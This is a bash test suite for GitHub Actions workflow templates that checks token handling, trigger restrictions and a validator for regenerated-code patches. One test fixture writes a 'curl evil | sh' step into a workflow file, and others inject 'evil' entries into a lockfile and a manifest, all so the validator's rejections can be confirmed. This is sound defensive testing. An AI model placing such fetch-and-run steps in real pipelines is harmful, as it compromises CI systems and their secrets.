mutate "pub/cargo report waits on a change" impl $'      - name: Report exact pins (pub and cargo lanes)\n' $'      - name: Report exact pins (pub and cargo lanes)\n        if: ${{ steps.patch.outputs.changed == \'true\' }}\n'
mutate "pub/cargo report replaces pins.md" impl 'cat "$section" >> "$report"' 'cat "$section" > "$report"'
mutate "pub/cargo report skips the summary" impl 'cat "$section" >> "$GITHUB_STEP_SUMMARY"' 'true'
mutate "cargo takes the first search line" impl '$1 == n && $2 == "="' '$2 == "="'
mutate "cargo caret range counted as a pin" impl 'test("^=[0-9]+\\.[0-9]+\\.[0-9]+([-+][0-9A-Za-z.+-]*)?$"))
                   | "\($m)' 'test("^[=^]?[0-9]+\\.[0-9]+\\.[0-9]+([-+][0-9A-Za-z.+-]*)?$"))
                   | "\($m)'
mutate "cargo path dependency looked up" impl '| select((.source // "") | test("crates\\.io-index"))' '| select(true)'
mutate "pub range counted as a pin" impl '*:[[:space:]]*["\047]?[0-9]+' '*:[[:space:]]*[\^"\047]*[0-9]+'
mutate "failed flutter read as current" impl 'unevaluated+="$manifest (flutter pub outdated output not recognised)"$'"'"'\n'"'"'; continue' 'checked=$((checked + 1)); continue'
mutate "unsearchable crate read as current" impl 'unevaluated+="$manifest ($name: no latest version from cargo search)"$'"'"'\n'"'"'; lane_ok=0; continue' 'continue'
mutate "cargo search failure kills the step" impl 'newest="$(cargo_latest "$name" || true)"' 'newest="$(cargo_latest "$name")"'
mutate "cargo search status ignored" impl 'res="$(cargo search "$1" --limit 10 2>/dev/null)" || return 1' 'res="$(cargo search "$1" --limit 10 2>/dev/null || true)"'
mutate "no lane still writes a section" impl '[ "$wanted" -eq 1 ] || exit 0' 'true'
mutate "bun/npm heading reworded" impl 'echo "### Exact pins (bun and npm lanes)"' 'echo "### Exact pins (bun, npm, pub and cargo lanes)"'
mutate "bun/npm sentence reworded" impl 'No bun or npm lane declares an exact pin.' 'No bun or npm lane declares an exact pin in this repo.'
mutate "not-reported claim returns" impl '# do the same in a second section of their own (version 4).' '# exact pins are not reported in this version.'
mutate "pub/cargo report after the mint" impl $'      - name: Report exact pins (pub and cargo lanes)\n' $'      - name: Mint GitHub App token\n        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0\n        with:\n          client-id: ${{ secrets.PLATFORM_WRITER_APP_CLIENT_ID }}\n          private-key: ${{ secrets.PLATFORM_WRITER_APP_PRIVATE_KEY }}\n\n      - name: Report exact pins (pub and cargo lanes)\n'

mutate "holds report waits on a change" impl $'      - name: Report bare ignore holds\n' $'      - name: Report bare ignore holds\n        if: ${{ steps.patch.outputs.changed == \'true\' }}\n'
mutate "holds report after the mint" impl $'      - name: Report bare ignore holds\n' $'      - name: Mint GitHub App token\n        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0\n        with:\n          client-id: ${{ secrets.PLATFORM_WRITER_APP_CLIENT_ID }}\n          private-key: ${{ secrets.PLATFORM_WRITER_APP_PRIVATE_KEY }}\n\n      - name: Report bare ignore holds\n'
mutate "a limited hold counted as bare" impl '$4 ~ /^dependency-name:[^;]+$/ { print $1 "\t" $2 "\t" substr($4, 17) }' '$4 ~ /^dependency-name:/ { n = substr($4, 17); sub(/;.*/, "", n); print $1 "\t" $2 "\t" n }'
mutate "holds baked in, not read at run time" impl 'if [ -f .github/dependabot.yml ]; then' 'if false; then'
mutate "parser hand-copied into the step" impl '{{IGNORE_RULES_AWK}}' 'function trim(s) { return s } { next }'
mutate "unsupported ecosystem read as current" impl $'Could not evaluate (no lookup for $eco)"$\'\\n\'; continue ;;' $'"$\'\\n\'; continue ;;'
mutate "hold with no refreshed lane read as current" impl $'Could not evaluate (no $eco lane at $dir is refreshed here)"$\'\\n\'; continue ;;' $'x"$\'\\n\'; continue ;;'
mutate "failed lookup read as current" impl $'unevaluated+="- \\`$lane\\` \\`$name\\`: Could not evaluate ($(cat "$cache/$key.err"))"$\'\\n\'; continue' 'checked=$((checked + 1)); continue'
mutate "stale hold never listed" impl 'if [ -n "$newest" ] && [ "$newest" != "$resolved" ]; then
              behind+="| \`$lane\`' 'if false; then
              behind+="| \`$lane\`'
mutate "holds heading reworded" impl 'echo "### Bare ignore: holds"' 'echo "### Bare ignores"'
mutate "holds report skips the summary" impl '          cat "$section" >> "$report"
          cat "$section" >> "$GITHUB_STEP_SUMMARY"

      # The ONLY' '          cat "$section" >> "$report"

      # The ONLY'

# ===================================================================================
# 13. THE CODEGEN WORKFLOW (deps-cadence-codegen.template.yml, #519)
# ===================================================================================
# Opt-in third workflow: regenerates a repo's COMMITTED generated code on the
# cadence PR when the refresh moved a generator. It keeps the #514/#517 split
# (regen runs repo and package code with no secret; push runs none, validates
# the untrusted patch BEFORE minting the token, and keeps the token out of
# argv, hooks and global git config) and adds a REVIEW RULE, because the
# allowed paths ARE app code and the cadence PR otherwise auto-merges unseen:
#
#   - auto-mergeable only if EVERY changed line is exactly empty, judged on a
#     plain `--unified=0` diff. NEVER `-w` / `--ignore-blank-lines`: `-w`
#     ignores whitespace inside a line, so a changed string literal (a GraphQL
#     document, a URL) would pass as cosmetic. velovate's first version used it
#     and a review caught it, so a case here builds that exact bypass and shows
#     `git diff -w` calling it empty while the classifier calls it substantive.
#   - anything else (spaces- or tab-only lines, CR/CRLF, reorders, mode
#     changes, `\ No newline`, binary headers, an empty or malformed diff, an
#     error, any value that is not an explicit "false") is SUBSTANTIVE:
#     auto-merge is disabled and the PR dequeued BEFORE the push, nothing is
#     pushed if the re-read PR state is still armed or queued, then one PR
#     comment asks for a human review.
#
# Static rules (cg_static) read the template; executed rules (cg_exec) EXTRACT
# each block between its `# BEGIN <name>` / `# END <name>` markers and run it,
# so they test the code CI runs and not a copy of it:
#   validate-codegen-patch  hostile patches, each asserted by its rejection
#                           reason: workflow, lockfile and manifest edits, an
#                           app-source edit outside the globs, create, delete,
#                           rename, mode change, binary hunk, symlink, a
#                           look-alike directory, an odd path, a non-cadence
#                           branch, the loop breaker, an empty artifact; the
#                           deny list holding when the globs are widened; and
#                           a deep file matching `**/` (which an unquoted glob
#                           expansion would break).
#   glob-to-re              the one function the push job and render-cadence.sh
#                           both run.
#   classify-codegen-diff   the review rule above.
#   push-codegen            against a stubbed `gh` and a local bare remote:
#                           disarm-before-push, a failed disarm pushes nothing,
#                           an unarmed non-substantive push leaves auto-merge.
# Also pinned: every git call in the push job, and in the impl's open-pr job,
# passes the hook-disabling `nohooks` (the impl's `git ls-files -s` was the one
# that did not, found in review of #519), and the codegen workflow's toolchain
# reader steps are byte-identical to the impl's (render-cadence.sh validates a
# pin by running the impl's reader).
CODEGEN="$TPL_DIR/deps-cadence-codegen.template.yml"
CGW="$WORK/cg"; mkdir -p "$CGW"
# The test repos must not inherit this machine's git config: a global
# core.autocrlf would normalise the CR cases away before they are classified.
export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null

CG_BOT="sassydog-platform-writer[bot]"

# all_run_bodies <file> — every `run: |` body, dedented.
all_run_bodies() {
    awk '
        /^        run: \|$/ { body = 1; next }
        body && /^[[:space:]]*$/ { print ""; next }
        body && !/^          / { body = 0 }
        body { sub(/^          /, ""); print }' "$1"
}

# bare_git <text> — `git <subcommand>` calls that do not pass `nohooks` or -c.
# `git config` is exempt (it writes the identity and runs nothing). A quoted
# word after "git" in an error message is prose, not a call.
bare_git() {
    grep -oE "(^|[^[:alnum:]_.\"'/-])git [a-z][a-z-]*" <<<"$1" | sed -E 's/^[^g]*//' | grep -vE '^git config$' || true
}

# if_block <file> <job> — the job's `if:` expression (a folded scalar).
if_block() {
    job_block "$1" "$2" | awk '
        /^    if: / { f = 1; print; next }
        f && /^      / { print; next }
        f { exit }'
}

cg_static() { # <codegen template> <impl template>
    local tpl="$1" impl="$2" rc=0 c jr jp frag mint_ln val_ln cls_ln n u blocks bodies
    c="$(code "$tpl")"
    jr="$(job_block "$tpl" regen | grep -vE '^[[:space:]]*#')"
    jp="$(job_block "$tpl" push | grep -vE '^[[:space:]]*#')"
    if [ -z "$jr" ] || [ -z "$jp" ]; then echo "could not slice the regen and push jobs (renamed?)"; return 1; fi

    # Trigger: pull_request only, never pull_request_target, never a schedule.
    grep -qE '^  pull_request:$' <<<"$c" || { echo "the codegen workflow is not triggered by pull_request"; rc=1; }
    if grep -qE 'pull_request_target|workflow_run|^  schedule:|workflow_dispatch' <<<"$c"; then
        echo "the codegen workflow has a trigger other than pull_request (pull_request_target runs with secrets on fork code)"; rc=1
    fi

    # The gate, repeated on EVERY job; the sender gate on the job holding the token.
    local gate_r gate_p
    gate_r="$(if_block "$tpl" regen)"; gate_p="$(if_block "$tpl" push)"
    for frag in "github.event.pull_request.user.login == '$CG_BOT'" \
                "startsWith(github.event.pull_request.head.ref, 'chore/deps-')" \
                "github.event.pull_request.head.repo.full_name == github.repository"; do
        grep -qF -- "$frag" <<<"$gate_r" || { echo "regen's gate lacks: $frag"; rc=1; }
        grep -qF -- "$frag" <<<"$gate_p" || { echo "push's gate lacks: $frag"; rc=1; }
    done
    grep -qF -- "github.event.sender.login == '$CG_BOT'" <<<"$gate_p" \
        || { echo "push's gate lacks the sender check (a human push would be committed under the App's name)"; rc=1; }
    grep -qF -- "needs.regen.outputs.changed == 'true'" <<<"$gate_p" || { echo "push runs when regen found nothing"; rc=1; }

    # regen: package code, so no secret and no App token, hosted, read-only.
    if grep -qE 'secrets\.|create-github-app-token|app_token' <<<"$jr"; then
        echo "the regen job references a secret or the App token; it runs the repo's generator and must hold neither"; rc=1
    fi
    grep -qE '^    runs-on: ubuntu-latest$' <<<"$jr" && grep -qE '^    runs-on: ubuntu-latest$' <<<"$jp" \
        || { echo "regen and push must run on ubuntu-latest (ephemeral, GitHub-hosted)"; rc=1; }
    if grep -qE 'self-hosted|\{\{RUNNER\}\}' <<<"$c"; then echo "the codegen workflow names a self-hosted runner"; rc=1; fi

    # One credential, minted once, in push, after the patch is validated and classified.
    if [ "$(grep -cE 'actions/create-github-app-token@' <<<"$c")" -ne 1 ] || ! grep -qE 'actions/create-github-app-token@' <<<"$jp"; then
        echo "the App token must be minted exactly once, in push"; rc=1
    fi
    mint_ln="$(grep -n 'actions/create-github-app-token@' "$tpl" | head -1 | cut -d: -f1)"
    val_ln="$(grep -n '^      - name: Validate and apply the codegen patch$' "$tpl" | head -1 | cut -d: -f1)"
    cls_ln="$(grep -n '^      - name: Classify the regenerated diff$' "$tpl" | head -1 | cut -d: -f1)"
    if [ -z "$mint_ln" ] || [ -z "$val_ln" ] || [ -z "$cls_ln" ] || [ "$mint_ln" -lt "$val_ln" ] || [ "$mint_ln" -lt "$cls_ln" ]; then
        echo "the App token is minted before the patch is validated and classified (or a step was renamed)"; rc=1
    fi
    local mint
    mint="$(step_block "$tpl" "Mint GitHub App token")"
    grep -qE '^          permission-contents: write$' <<<"$mint" && grep -qE '^          permission-pull-requests: write$' <<<"$mint" \
        || { echo "the mint does not request exactly contents and pull-requests write"; rc=1; }
    grep -qE '^          repositories: ' <<<"$mint" || { echo "the mint is not scoped to this repository (repositories:)"; rc=1; }
    if [ "$(grep -cE '^          permission-' <<<"$mint")" -ne 2 ]; then echo "the mint requests a permission beyond contents and pull-requests"; rc=1; fi
    local used
    used="$(grep -oE 'secrets\.[A-Za-z_][A-Za-z0-9_]*' <<<"$c" | sort -u)"
    if grep -vqxE 'secrets\.PLATFORM_WRITER_APP_(CLIENT_ID|PRIVATE_KEY)' <<<"$used"; then
        echo "the codegen workflow reads a secret other than the two App credentials: $(tr '\n' ' ' <<<"$used")"; rc=1
    fi
    if grep -qE 'GITHUB_TOKEN|github\.token' <<<"$c"; then echo "the codegen workflow reads the built-in token (no fallback credential)"; rc=1; fi
    if grep -qE '^[[:space:]]*(contents|pull-requests|issues|actions|id-token|packages|checks|statuses|deployments|security-events|pages|discussions|attestations):[[:space:]]*write' <<<"$c"; then
        echo "the built-in token is granted write"; rc=1
    fi
    while IFS= read -r frag; do
        [ -n "$frag" ] || continue
        [[ "$frag" =~ ^[[:space:]]*GH_TOKEN:[[:space:]]*\$\{\{[[:space:]]*steps\.app_token\.outputs\.token[[:space:]]*\}\}[[:space:]]*$ ]] \
            || { echo "GH_TOKEN is not exactly the minted App token: $frag"; rc=1; }
    done < <(grep -E '^[[:space:]]*GH_TOKEN:' <<<"$c")
    if grep -qE 'continue-on-error' <<<"$c"; then echo "continue-on-error in the codegen workflow"; rc=1; fi

    # push runs nothing but git, gh, awk and three actions.
    while IFS= read -r u; do
        [ -n "$u" ] || continue
        case "$u" in
            actions/checkout@*|actions/download-artifact@*|actions/create-github-app-token@*) ;;
            *) echo "push uses '$u'; it may use only checkout, download-artifact and the token action"; rc=1 ;;
        esac
    done < <(sed -nE 's/^[[:space:]]*(- )?uses:[[:space:]]*([^[:space:]]+).*/\2/p' <<<"$jp")
    if grep -qE '(^|[;&|({[:space:]])(bun|bunx|npm|npx|yarn|pnpm|node|flutter|dart|cargo|rustup|pod|make|python3?|pip3?|perl|ruby)([[:space:]]|$)' <<<"$jp"; then
        echo "push runs a package manager or interpreter: $(grep -E '(^|[;&|({[:space:]])(bun|bunx|npm|npx|yarn|pnpm|node|flutter|dart|cargo|rustup|pod|make|python3?|pip3?|perl|ruby)([[:space:]]|$)' <<<"$jp" | head -1 | tr -s ' ')"; rc=1
    fi
    # Checkout never persists credentials into .git/config.
    n="$(grep -cE 'actions/checkout@' <<<"$c")"
    if [ "$n" -lt 2 ] || [ "$(grep -cE '^          persist-credentials: false$' <<<"$c")" -ne "$n" ]; then
        echo "every checkout must set persist-credentials: false"; rc=1
    fi
    # Untrusted event values reach a shell only through env:, never by interpolation.
    bodies="$(all_run_bodies "$tpl")"
    if grep -qF '${{' <<<"$bodies"; then
        echo "a run: body interpolates a \${{ }} expression (script injection); pass it through env:"; rc=1
    fi
    grep -qE '^  group: deps-cadence-codegen-\$\{\{ github\.event\.pull_request\.number \}\}$' <<<"$c" \
        && grep -qE '^  cancel-in-progress: false$' <<<"$c" \
        || { echo "one run per PR at a time (concurrency group by PR number, no cancel)"; rc=1; }

    # The push-job blocks.
    blocks="$CGW/static-blocks.sh"
    : > "$blocks"
    for n in validate-codegen-patch classify-codegen-diff push-codegen; do
        if ! cg_blk "$tpl" "$n" "$CGW/s-$n.sh"; then echo "could not extract the $n block"; rc=1; continue; fi
        grep -vE '^[[:space:]]*#' "$CGW/s-$n.sh" >> "$blocks"
    done
    local bg
    bg="$(bare_git "$(cat "$blocks")")"
    [ -z "$bg" ] || { echo "push-job git call(s) without nohooks (a hook inherits the step's environment): $(tr '\n' ';' <<<"$bg")"; rc=1; }
    bg="$(bare_git "$(job_block "$impl" open-pr | grep -vE '^[[:space:]]*#')")"
    [ -z "$bg" ] || { echo "the impl's open-pr job has git call(s) without nohooks: $(tr '\n' ';' <<<"$bg")"; rc=1; }

    # Token handling in the push block: one-shot env-reading helper, never argv or a URL.
    local pushblk classblk valblk
    pushblk="$(grep -vE '^[[:space:]]*#' "$CGW/s-push-codegen.sh" 2>/dev/null)"
    classblk="$(grep -vE '^[[:space:]]*#' "$CGW/s-classify-codegen-diff.sh" 2>/dev/null)"
    valblk="$(grep -vE '^[[:space:]]*#' "$CGW/s-validate-codegen-patch.sh" 2>/dev/null)"
    grep -qF -- "-c 'credential.helper=!f() { echo username=x-access-token; echo \"password=\$GH_TOKEN\"; }; f'" <<<"$pushblk" \
        && grep -qF -- '-c credential.helper= \' <<<"$pushblk" \
        || { echo "the push does not use the single-quoted env-reading credential helper (after clearing any other)"; rc=1; }
    if grep -qE 'x-access-token:|@github\.com|GH_TOKEN[^"]*@' <<<"$pushblk"; then echo "the token is in a push URL or argv"; rc=1; fi
    grep -qF 'export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null' <<<"$pushblk" \
        && grep -qF 'export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null' <<<"$valblk" \
        && grep -qF 'export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null' <<<"$classblk" \
        || { echo "a push-job block honours system or global git config"; rc=1; }
    # Fail closed.
    grep -qE '^substantive=true$' <<<"$pushblk" && grep -qF '[ "${SUBSTANTIVE:-}" = "false" ] && substantive=false' <<<"$pushblk" \
        || { echo "the push does not default to substantive and accept only an explicit false"; rc=1; }
    grep -qE '^substantive=true$' <<<"$classblk" || { echo "the classifier does not default to substantive"; rc=1; }
    # The classifier: a plain --unified=0 diff, never -w.
    if grep -qE '(^|[[:space:]])(-w|--ignore-[a-z-]+|-b|--word-diff[a-z=-]*|-I)([[:space:]]|$)' <<<"$classblk"; then
        echo "the classifier ignores whitespace (-w / --ignore-*): that calls a changed string literal cosmetic"; rc=1
    fi
    for frag in '--unified=0' '--no-ext-diff' '--no-textconv' '--no-color' 'color.ui=false' 'core.quotePath=true'; do
        grep -qF -- "$frag" <<<"$classblk" || { echo "the classifier does not force $frag"; rc=1; }
    done
    grep -qF 'raw="$(env -u GIT_EXTERNAL_DIFF -u GIT_DIFF_OPTS' <<<"$classblk" || { echo "the classifier does not unset GIT_EXTERNAL_DIFF / GIT_DIFF_OPTS"; rc=1; }
    # Disarm BEFORE the push, decided by the re-read PR state; the loop breaker and the glob read.
    local dis_ln push_ln
    dis_ln="$(grep -n 'Could not disarm PR' <<<"$pushblk" | head -1 | cut -d: -f1)"
    push_ln="$(grep -n 'push "\${GITHUB_SERVER_URL}' <<<"$pushblk" | head -1 | cut -d: -f1)"
    if [ -z "$dis_ln" ] || [ -z "$push_ln" ] || [ "$dis_ln" -gt "$push_ln" ]; then echo "auto-merge is not disarmed (and verified) before the push"; rc=1; fi
    grep -qF 'refusing to push again' <<<"$valblk" || { echo "no loop breaker in the validator"; rc=1; }
    grep -qF 'read -r -a globs <<<"$CODEGEN_GLOBS"' <<<"$valblk" || { echo "the globs are not read with read -a (an unquoted expansion would glob against the checkout)"; rc=1; }
    grep -qF "denied='^\\.git(hub)?/" <<<"$valblk" || { echo "the validator carries no deny list for workflows, manifests and lockfiles"; rc=1; }

    # The toolchain reader steps are the impl's, byte for byte.
    local name a b
    for name in "Read the Flutter pin" "Read the Rust toolchain pin"; do
        a="$(step_run "$impl" "$name")"; b="$(step_run "$tpl" "$name")"
        if [ -z "$a" ] || [ -z "$b" ]; then echo "reader step '$name' missing from the impl or the codegen template"; rc=1
        elif [ "$a" != "$b" ]; then echo "reader step '$name' differs from the impl's (the renderer validates a pin by running the impl's)"; rc=1; fi
    done
    return "$rc"
}

# ─── executed: fixtures ──────────────────────────────────────────────────────────────
CG_GEN="apps/mobile/lib/graphql/__generated__"
CG_REQ="$CG_GEN/weather_queries.req.gql.dart"
CG_G="$CG_GEN/weather_queries.req.gql.g.dart"
CG_MOCKS="apps/mobile/test/providers/chat_provider_test.mocks.dart"
CG_TOP="apps/mobile/test/top_test.mocks.dart"
CG_DEEP="apps/mobile/test/a/b/deep_test.mocks.dart"
CG_GLOBS="$CG_GEN/*.gql.dart $CG_GEN/*.gql.g.dart apps/mobile/test/**/*_test.mocks.dart"

# cg_blk <template> <name> <out> — the `# BEGIN <name>` … `# END <name>` block,
# dedented out of its `run: |` body.
cg_blk() {
    awk -v b="# BEGIN $2" -v e="# END $2" 'index($0, b){f=1} f{print} index($0, e){exit}' "$1" | sed -E 's/^ {10}//' > "$3"
    grep -q "END $2" "$3" && [ "$(wc -l < "$3")" -ge 3 ]
}

cg_make_repo() {
    local r="$1"
    mkdir -p "$r/$CG_GEN" "$r/apps/mobile/test/providers" "$r/apps/mobile/test/a/b" "$r/apps/mobile/lib" "$r/.github/workflows"
    git -C "$r" init -q -b main
    git -C "$r" config user.email test@example.com
    git -C "$r" config user.name test
    printf '// GENERATED\nimport "a.dart";\n' > "$r/$CG_REQ"
    printf '// GENERATED\npart of x;\n' > "$r/$CG_G"
    printf '// Mocks\nimport "b.dart";\n' > "$r/$CG_MOCKS"
    printf '// Mocks\nimport "t.dart";\n' > "$r/$CG_TOP"
    printf '// Mocks\nimport "d.dart";\n' > "$r/$CG_DEEP"
    printf 'void main() {}\n' > "$r/apps/mobile/lib/main.dart"
    printf 'name: app\n' > "$r/apps/mobile/pubspec.yaml"
    printf 'packages: {}\n' > "$r/apps/mobile/pubspec.lock"
    printf 'name: ci\n' > "$r/.github/workflows/ci.yml"
    git -C "$r" add -A
    git -C "$r" commit -qm "chore(deps): monthly lockfile refresh 2026-11"
}
# cg_snap <repo> — the artifact patch, built the way regen builds it, then the
# tree reset to HEAD as on push's fresh VM.
cg_snap() {
    local r="$1"
    mkdir -p "$r.rt/codegen-in"
    git -C "$r" add -A
    git -C "$r" diff --cached --binary --no-renames --no-ext-diff --no-textconv > "$r.rt/codegen-in/codegen.patch"
    git -C "$r" reset -q --hard HEAD
    git -C "$r" clean -qfd
}
cg_blank() { printf '\n' >> "$1/$2"; }

# cg_ctx <template> — extract the blocks and read the subject; sets VAL CLS PSH SUBJ.
cg_ctx() {
    VAL="$CGW/validate.sh"; CLS="$CGW/classify.sh"; PSH="$CGW/push.sh"; GLB="$CGW/glob.sh"
    cg_blk "$1" validate-codegen-patch "$VAL" || { echo "could not extract validate-codegen-patch"; return 1; }
    cg_blk "$1" classify-codegen-diff "$CLS" || { echo "could not extract classify-codegen-diff"; return 1; }
    cg_blk "$1" push-codegen "$PSH" || { echo "could not extract push-codegen"; return 1; }
    cg_blk "$1" glob-to-re "$GLB" || { echo "could not extract glob-to-re"; return 1; }
    SUBJ="$(sed -n 's/^ *CODEGEN_SUBJECT: "\(.*\)"$/\1/p' "$1")"
    [ -n "$SUBJ" ] || { echo "CODEGEN_SUBJECT not found"; return 1; }
}

cg_rc=0
cg_fail() { echo "$1"; cg_rc=1; }

# cgv <repo> <accept|reject> <label> [needle] [ref] [globs]
cgv() {
    local repo="$1" want="$2" label="$3" needle="${4:-}" ref="${5:-chore/deps-2026-11}" globs="${6-$CG_GLOBS}" got
    ( cd "$repo" && RUNNER_TEMP="$repo.rt" HEAD_REF="$ref" CODEGEN_SUBJECT="$SUBJ" CODEGEN_GLOBS="$globs" \
        bash "$VAL" >"$CGW/out" 2>&1 ); got=$?
    if [ "$want" = accept ]; then
        [ "$got" -eq 0 ] || cg_fail "$label: wanted accept, got exit $got: $(tail -n1 "$CGW/out")"
        return
    fi
    if [ "$got" -eq 0 ]; then cg_fail "$label: ACCEPTED"; return; fi
    if [ -n "$needle" ] && ! grep -qF -- "$needle" "$CGW/out"; then
        cg_fail "$label: rejected for another reason (wanted '$needle'): $(tail -n1 "$CGW/out")"; return
    fi
    [ -z "$(git -C "$repo" status --porcelain)" ] || cg_fail "$label: rejected only AFTER changing the tree"
}

# cg_glob <pattern> <path> <y|n>
cg_glob() {
    local re
    re="$(bash -c '. "$1"; glob_to_re "$2"' _ "$GLB" "$1")"
    if [[ "$2" =~ $re ]]; then [ "$3" = y ] || cg_fail "glob '$1' matched '$2' (regex $re)"
    else [ "$3" = n ] || cg_fail "glob '$1' did not match '$2' (regex $re)"; fi
}

# ─── executed: classification ───────────────────────────────────────────────────────
cg_lock_repo() { # <dir> — merge base (tagged base), then the cadence commit moving a lockfile.
    local r="$1"
    cg_make_repo "$r"
    printf 'packages:\n  code_builder:\n    version: "4.11.1"\n  http:\n    version: "1.0.0"\n' > "$r/apps/mobile/pubspec.lock"
    git -C "$r" add -A && git -C "$r" commit -qm base && git -C "$r" tag base
    printf 'packages:\n  code_builder:\n    version: "4.12.0"\n  http:\n    version: "1.1.0"\n' > "$r/apps/mobile/pubspec.lock"
    git -C "$r" add -A && git -C "$r" commit -qm "chore(deps): monthly lockfile refresh 2026-11"
}
CLS_OUT=""
cg_classify() { # <repo> [env…] — sets CLS_OUT
    local r="$1"; shift
    : > "$r.out"; mkdir -p "$r.rt"; rm -f "$r.rt/codegen-review.md"
    ( cd "$r" && env RUNNER_TEMP="$r.rt" GITHUB_OUTPUT="$r.out" BASE_SHA="$(git -C "$r" rev-parse base)" \
        PR_NUMBER=2401 CODEGEN_SUBJECT="$SUBJ" "$@" bash "$CLS" >"$CGW/out" 2>&1 )
    local rc=$?
    CLS_OUT="$(sed -n 's/^substantive=//p' "$r.out")"
    return $rc
}
cg_sub() { # <label> <repo> — must be substantive=true
    cg_classify "$2" || cg_fail "$1: classify exited non-zero"
    [ "$CLS_OUT" = true ] || cg_fail "$1: classified '$CLS_OUT', wanted substantive=true (this would stay auto-merge-armed)"
}
cg_seed_strings() { # <dir> — a generated file holding a GraphQL document and a URL in strings.
    cg_lock_repo "$1"
    printf 'const document = "query Weather { forecast(city: \\"x\\") { temp } }";\nconst url = "https://api.example.com/graphql";\nfinal a = 1;\nfinal b = 2;\n' > "$1/$CG_REQ"
    git -C "$1" add -A && git -C "$1" commit -qm "seed strings"
}

# ─── executed: push ──────────────────────────────────────────────────────────────────
# A recording `gh`: state in $GHS (queued / armed = true|false; fail_disable
# exists → `pr merge --disable-auto` fails). The disarm records where the remote
# branch stood at that moment.
cg_stub() {
    STUB="$CGW/stub-bin"; mkdir -p "$STUB"
    cat > "$STUB/gh" <<'STUBEOF'
#!/usr/bin/env bash
echo "gh $*" >> "$GHS/log"
case "$1 $2" in
  "api users/"*) echo 4242 ;;
  "api graphql")
    if printf '%s' "$*" | grep -q dequeuePullRequest; then echo false > "$GHS/queued"; echo '{}'; exit 0; fi
    echo "PR_kwDO $(cat "$GHS/queued") $(cat "$GHS/armed")" ;;
  "pr merge")
    [ -e "$GHS/fail_disable" ] && { echo "disable failed" >&2; exit 1; }
    git -C "$REMOTE" rev-parse refs/heads/chore/deps-2026-11 > "$GHS/remote_at_disable"
    echo false > "$GHS/armed" ;;
  "pr comment")
    while [ $# -gt 0 ]; do [ "$1" = "--body-file" ] && cp "$2" "$GHS/comment"; shift; done ;;
esac
STUBEOF
    chmod +x "$STUB/gh"
}
# cg_push_repo <name> <queued> <armed> — bare remote with the cadence branch, a
# clone at its head with a staged regen, fresh stub state.
cg_push_repo() {
    local name="$1"
    PR_R="$CGW/$name"; GHS="$CGW/$name.gh"; REMOTE="$CGW/$name.srv/Example/repo.git"
    rm -rf "$PR_R" "$GHS" "$CGW/$name.srv" "$CGW/$name.seed" "$PR_R.rt"
    mkdir -p "$GHS" "$(dirname "$REMOTE")" "$PR_R.rt"
    echo "$2" > "$GHS/queued"; echo "$3" > "$GHS/armed"
    cg_make_repo "$CGW/$name.seed"
    git clone -q --bare "$CGW/$name.seed" "$REMOTE"
    git -C "$REMOTE" branch -q chore/deps-2026-11 main
    git clone -q -b chore/deps-2026-11 "$REMOTE" "$PR_R"
    git -C "$PR_R" config user.email test@example.com; git -C "$PR_R" config user.name test
    OLD_HEAD="$(git -C "$PR_R" rev-parse HEAD)"
    cg_blank "$PR_R" "$CG_REQ"; git -C "$PR_R" add -A
}
cg_run_push() { # <substantive value or UNSET>
    local sub=(SUBSTANTIVE="$1"); [ "$1" = UNSET ] && sub=()
    ( cd "$PR_R" && env -u SUBSTANTIVE PATH="$STUB:$PATH" GHS="$GHS" REMOTE="$REMOTE" RUNNER_TEMP="$PR_R.rt" \
        HEAD_REF=chore/deps-2026-11 PR_NUMBER=2401 CODEGEN_SUBJECT="$SUBJ" GH_TOKEN=dummy APP_SLUG=sassydog-platform-writer \
        GITHUB_SERVER_URL="file://$CGW/${PR_R##*/}.srv" GITHUB_REPOSITORY=Example/repo "${sub[@]}" \
        bash "$PSH" >"$CGW/out" 2>&1 )
}
cg_remote_head() { git -C "$REMOTE" rev-parse refs/heads/chore/deps-2026-11; }
cg_called() { grep -qF -- "$1" "$GHS/log" 2>/dev/null; }

cg_exec() { # <codegen template> — 0 when every executed rule holds
    cg_rc=0
    cg_ctx "$1" || return 1
    local R name

    # ── validate-codegen-patch ──
    R="$CGW/v-valid"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    cg_blank "$R" "$CG_REQ"; cg_blank "$R" "$CG_G"; cg_blank "$R" "$CG_MOCKS"; cg_blank "$R" "$CG_TOP"; cg_blank "$R" "$CG_DEEP"
    cg_snap "$R"; cgv "$R" accept "a generated-only patch"
    [ "$(git -C "$R" diff --cached --name-only | wc -l | tr -d ' ')" = 5 ] \
        || cg_fail "the five generated files (including the nested and top-level mocks) were not all staged"

    R="$CGW/v-workflow"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    cg_blank "$R" "$CG_REQ"; echo "  run: curl evil | sh" >> "$R/.github/workflows/ci.yml"; cg_snap "$R"
    cgv "$R" reject "a workflow edit" ".github/workflows/ci.yml is a workflow, manifest or lockfile"
    R="$CGW/v-lock"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    cg_blank "$R" "$CG_REQ"; echo "  evil: 1.0.0" >> "$R/apps/mobile/pubspec.lock"; cg_snap "$R"
    cgv "$R" reject "a lockfile edit" "apps/mobile/pubspec.lock is a workflow, manifest or lockfile"
    R="$CGW/v-manifest"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    echo "dependencies: {evil: any}" >> "$R/apps/mobile/pubspec.yaml"; cg_snap "$R"
    cgv "$R" reject "a manifest edit" "apps/mobile/pubspec.yaml is a workflow, manifest or lockfile"
    R="$CGW/v-appsrc"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    echo "// injected" >> "$R/apps/mobile/lib/main.dart"; cg_snap "$R"
    cgv "$R" reject "an app-source edit outside the globs" "apps/mobile/lib/main.dart is outside the generated-file paths"
    R="$CGW/v-create"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
    printf '// new\n' > "$R/$CG_GEN/new_op.req.gql.dart"; cg_snap "$R"
    cgv "$R" reject "a create" "it creates, deletes, renames, copies or re-modes a file"
